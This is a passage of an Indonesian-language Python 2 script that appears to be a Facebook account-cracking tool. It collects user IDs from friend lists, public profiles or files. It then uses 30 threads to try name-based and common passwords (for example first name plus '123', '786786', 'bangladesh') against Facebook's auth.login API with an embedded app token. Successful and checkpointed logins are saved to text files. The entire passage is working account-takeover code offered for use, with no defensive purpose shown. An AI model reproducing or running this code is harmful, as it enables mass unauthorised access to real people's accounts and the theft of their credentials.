                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/save.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/save.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/save.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/save.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mSelesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/save.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;93mKembali\x1b[1;97m>}')
    os.system('python2 cr4ck.py')
def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;96m01\x1b[1;97m} Crack Dari Daftar Teman'
    print '\x1b[1;97m{\x1b[1;96m02\x1b[1;97m} Crack Dari Publik/Teman'
    print '\x1b[1;97m{\x1b[1;96m03\x1b[1;97m} Crack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Kembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_bangla()
def pilih_bangla():
    teak = raw_input('\x1b[1;96m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar !'
        pilih_bangla()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idb = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
                raw_input('\n\x1b[1;96m{\x1b[1;97m<Kembali>\x1b[1;96m}')
                crack_bangla()
            except requests.exceptions.ConnectionError:
                print '{!} Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama File \x1b[1;91m:\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;96m{\x1b[1;97m<Kembali>\x1b[1;96m}')
                crack_bangla()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar !'
            pilih_bangla()
        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Stop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/bangla.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos1
                cek = open('done/bangla.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/bangla.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos2
                    cek = open('done/bangla.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/bangla.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos3
                        cek = open('done/bangla.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '786786'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/bangla.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos4
                            cek = open('done/bangla.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'bangladesh'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/bangla.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos5
                                cek = open('done/bangla.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/bangla.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos6
                                    cek = open('done/bangla.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/bangla.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos7
                                        cek = open('done/bangla.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/bangla.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos8
                                            cek = open('done/bangla.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
